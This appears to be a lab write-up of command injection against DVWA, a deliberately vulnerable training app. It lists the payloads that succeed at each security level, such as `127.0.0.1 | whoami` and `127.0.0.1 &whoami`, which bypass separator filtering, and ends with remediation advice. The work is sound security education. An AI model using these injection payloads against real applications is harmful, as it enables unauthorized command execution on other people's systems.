# Command Injection

## Overview

Command Injection is a vulnerability that allows attackers to execute operating system commands by injecting malicious input into an application's command execution functionality.


## Security Level Comparison

| Feature | Low | Medium | High |
|---------|------|---------|------|
| Protection | None | Basic command separator filtering | Enhanced filtering |
| Successful Payload | `&&` | `\|` | `&` |
| Exploitation Difficulty | Easy | Moderate | Moderate |

> **Note:** Payloads shown below are based on the tested DVWA environment (Linux).

---

## Low Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `127.0.0.1` | Verify normal functionality | Ping executed successfully. |
| `127.0.0.1 && whoami` | Execute an additional OS command | Current user displayed. |
| `127.0.0.1 && id` | Enumerate current user information | User ID and group information displayed. |

### Observation

The application executes user input directly without validation, allowing arbitrary operating system commands.

### Evidence

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/Command_injection/01_low_result.png" width="100%">
</p>

---

## Medium Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `127.0.0.1 && whoami` | Test previous payload | ❌ Blocked |
| `127.0.0.1 ; whoami` | Test semicolon separator | ❌ Blocked |
| `127.0.0.1 \|\| whoami` | Test logical OR operator | ❌ Blocked |
| `127.0.0.1 \| whoami` | Bypass input filtering | ✅ Command executed successfully. |

### Observation

Common command separators were filtered, but the pipe (`|`) operator remained executable, allowing command injection.

### Evidence

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/Command_injection/02_medium_result.png" width="100%">
</p>

---

## High Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `127.0.0.1 && whoami` | Test previous bypass | ❌ Blocked |
| `127.0.0.1 \| whoami` | Test pipe operator | ❌ Blocked |
| `127.0.0.1 &whoami` | Bypass enhanced filtering | ✅ Command executed successfully. |

### Observation

Additional input filtering blocked previously successful payloads, but command execution remained possible using the background operator (`&`).

### Evidence

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/Command_injection/03_high_result.png" width="100%">
</p>

---

## Root Cause

The application passes user-controlled input directly to operating system commands without proper validation or safe command execution methods.

## Overall Impact

- Execute arbitrary operating system commands.
- Enumerate system information.
- Access or modify files depending on system permissions.
- Potentially gain further control over the underlying system.

## Remediation

- Avoid executing OS commands using user input.
- Use safe APIs or built-in language functions instead of shell commands.
- Validate input using strict allowlists.
- Run the application with the least required privileges.
- Disable unnecessary command execution wherever possible.
